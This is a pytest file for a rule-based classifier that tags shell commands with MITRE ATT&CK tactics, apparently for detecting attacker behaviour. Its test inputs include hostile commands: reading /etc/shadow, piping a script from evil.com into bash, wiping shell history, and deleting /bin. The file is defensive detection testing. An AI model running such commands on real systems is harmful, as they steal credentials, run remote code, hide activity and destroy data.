"""Tests for deterministic rule-based Intent Classifier."""
import pytest
from ai.intent_classifier import IntentClassifier
from backend.app.schemas.intent import IntentTactic
from backend.app.schemas.session import Command


def test_classify_reconnaissance():
    classifier = IntentClassifier()
    intents = classifier.classify_command("uname -a", session_id="s1")
    assert len(intents) > 0
    assert intents[0].intent == IntentTactic.RECONNAISSANCE
    assert intents[0].mitre_id == "T1082"
    assert intents[0].confidence >= 0.8


def test_classify_credential_access():
    classifier = IntentClassifier()
    intents = classifier.classify_command("cat /etc/shadow", session_id="s1")
    assert len(intents) > 0
    assert intents[0].intent == IntentTactic.CREDENTIAL_ACCESS
    assert intents[0].mitre_id == "T1003.008"


def test_classify_privilege_escalation():
    classifier = IntentClassifier()
    intents = classifier.classify_command("sudo su -", session_id="s1")
    assert len(intents) > 0
    assert intents[0].intent == IntentTactic.PRIVILEGE_ESCALATION
    assert intents[0].mitre_id == "T1548.003"


def test_classify_persistence():
    classifier = IntentClassifier()
    intents = classifier.classify_command("crontab -e", session_id="s1")
    assert len(intents) > 0
    assert intents[0].intent == IntentTactic.PERSISTENCE
    assert intents[0].mitre_id == "T1053.003"


def test_classify_execution():
    classifier = IntentClassifier()
    intents = classifier.classify_command("curl http://evil.com/x.sh | bash", session_id="s1")
    assert len(intents) > 0
    assert intents[0].intent == IntentTactic.EXECUTION
    assert intents[0].mitre_id == "T1059.004"


def test_classify_defense_evasion():
    classifier = IntentClassifier()
    intents = classifier.classify_command("history -c && rm -rf ~/.bash_history", session_id="s1")
    assert len(intents) > 0
    assert intents[0].intent == IntentTactic.DEFENSE_EVASION
    assert intents[0].mitre_id == "T1070.003"


def test_classify_destruction():
    classifier = IntentClassifier()
    intents = classifier.classify_command("rm -rf /bin", session_id="s1")
    assert len(intents) > 0
    assert intents[0].intent == IntentTactic.DESTRUCTION_TAMPERING
    assert intents[0].mitre_id == "T1485"


def test_benign_non_matching_command():
    classifier = IntentClassifier()
    intents = classifier.classify_command("echo hello world", session_id="s1")
    assert len(intents) == 0
